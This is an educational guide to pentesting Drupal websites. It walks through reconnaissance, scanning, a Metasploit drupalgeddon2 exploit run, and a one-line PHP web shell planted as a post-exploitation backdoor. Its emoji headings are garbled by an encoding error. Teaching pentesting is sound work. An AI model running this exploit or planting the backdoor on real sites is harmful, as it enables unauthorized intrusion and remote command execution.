# Drupal pentesting


# üëâ¬†Overview

### üëÄ¬†What ?

> Drupal pentesting, also known as penetration testing, refers to the process of testing a Drupal website to identify any vulnerabilities that could potentially be exploited by hackers. It is an essential practice in cybersecurity to ensure the security of a website.
> 

### üßê¬†Why ?

> Drupal pentesting is crucial as it allows developers and security professionals to discover and fix vulnerabilities before they can be exploited by attackers. By conducting pentesting, organizations can protect sensitive data and maintain the trust of their users.
> 

### ‚õèÔ∏è¬†How ?

> To conduct Drupal pentesting, you can follow these steps: 1. Information Gathering: Collect as much information as possible about the target Drupal website. 2. Scanning: Use tools like Nmap or Nessus to scan the target for open ports and services. 3. Vulnerability Assessment: Use tools like OpenVAS or Nexpose to identify vulnerabilities. 4. Exploitation: Use tools like Metasploit to exploit identified vulnerabilities. 5. Post-Exploitation: Determine the value of the compromised system and maintain access for later use. 6. Reporting: Document the findings and provide recommendations for improvement.

### ‚è≥¬†When ?

> Drupal pentesting should be conducted regularly, especially when any changes or updates have been made to the website. It's also highly recommended before launching a new website.

# ‚öôÔ∏è¬†Technical Explanations

Drupal penetration testing, often referred to as Drupal pentesting, is a comprehensive process with the goal of identifying any vulnerabilities in a Drupal website that could potentially be exploited by attackers. This is a crucial practice in cybersecurity as it allows for the discovery and remediation of vulnerabilities before they can be leveraged by malicious parties.

The process begins with **Information Gathering**, where as much data as possible about the target website is collected. This includes identifying the Drupal version being used, the themes and modules installed, and user information. Understanding the target's configuration and setup is a crucial first step in identifying possible vulnerabilities.

The next phase is **Scanning**, where tools like Nmap or Nessus are utilized to identify any open ports or services on the target system. This step can uncover potential entry points for an attacker.

After scanning, the **Vulnerability Assessment** phase starts. This involves the identification of potential vulnerabilities that could be exploited. Tools such as OpenVAS or Nexpose can be used to automate this process and provide a comprehensive list of vulnerabilities.

Following the identification of vulnerabilities, the **Exploitation** phase begins where these vulnerabilities are actually exploited using tools like Metasploit. This step involves leveraging identified vulnerabilities to gain unauthorized access or data from the system.

In the **Post-Exploitation** phase, the value of the compromised system is determined, and attempts are made to maintain access for later use. This could involve creating backdoors or disabling security measures to ensure future access.

The final step is **Reporting**, where all the findings are documented, including all identified and exploited vulnerabilities, along with any accessed data. Recommendations for improving the system's security are also provided at this stage. This report can then be used by the website's administrators or developers to improve the security measures in place.

This process should be conducted regularly, especially after any changes or updates to the website. It's also highly recommended before launching a new website to ensure its security from the get-go.

Let's take an example of Drupal pentesting using some commonly used tools:

**1. Information Gathering:**

We can use a tool like `Droopescan` to gather information about the target Drupal site. It can identify the version, themes, and modules.

```bash
droopescan scan drupal -u <http://targetsite.com>

```

This command scans the target Drupal site and provides information about its version, installed themes, and modules.

**2. Scanning:**

We can use a tool like `Nmap` to scan the target for open ports and services.

```bash
nmap -p 1-65535 -T4 -A -v <http://targetsite.com>

```

This command scans all ports (1-65535) on the target website and provides detailed information about any open ports and services.

**3. Vulnerability Assessment:**

We can use a tool like `Nikto` to identify vulnerabilities.

```bash
nikto -h <http://targetsite.com>

```

This scans the target website and provides a list of potential vulnerabilities.

**4. Exploitation:**

We can use a tool like `Metasploit` to exploit identified vulnerabilities.

```bash
msfconsole
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOST <http://targetsite.com>
run

```

This command opens Metasploit, sets the exploit to `drupal_drupalgeddon2` (a known Drupal vulnerability), sets the target site, and runs the exploit.

**5. Post-Exploitation:**

After successful exploitation, we might create a backdoor for later access.

```bash
echo '<?php echo shell_exec($_GET['cmd']); ?>' > shell.php

```

This creates a simple PHP backdoor that allows for remote command execution.

**6. Reporting:**

All findings, including exploited vulnerabilities and accessed data, are documented. This report can be used by the website's administrators or developers to improve the security measures in place.

Remember, this is an educational example and should not be used for malicious purposes. Always have permission before conducting any penetration testing.
